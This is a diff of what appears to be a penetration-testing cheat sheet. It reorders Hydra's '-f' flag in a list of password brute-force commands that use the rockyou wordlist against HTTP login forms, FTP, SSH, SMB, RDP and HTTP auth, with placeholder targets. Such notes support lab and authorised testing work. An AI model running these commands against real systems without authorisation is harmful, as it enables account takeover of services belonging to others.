@@ -84,25 +84,25 @@ Burp Suite > Intruder > Sniper attack > Positions Add > Payload Type = Simple li
 
 # 4° Password Brute Force
 
-$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
+$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt -f Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
 
 $ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp
 
-$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ssh
+$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt -f Target_IP ssh
 
-$ hydra -f -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP ssh
+$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt -f Target_IP ssh
 
 $ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP -s 2222 ssh
 
-$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP smb
+$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt -f Target_IP smb
 
-$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP rdp
+$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt -f Target_IP rdp
 
-$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP -s 33389 rdp
+$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt -f Target_IP -s 33389 rdp
 
-$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-get
+$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt -f Target_IP http-get
 
-$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP -s 8080 http-get
+$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt -f Target_IP -s 8080 http-get
 
 https://github.com/danielmiessler/SecLists
 
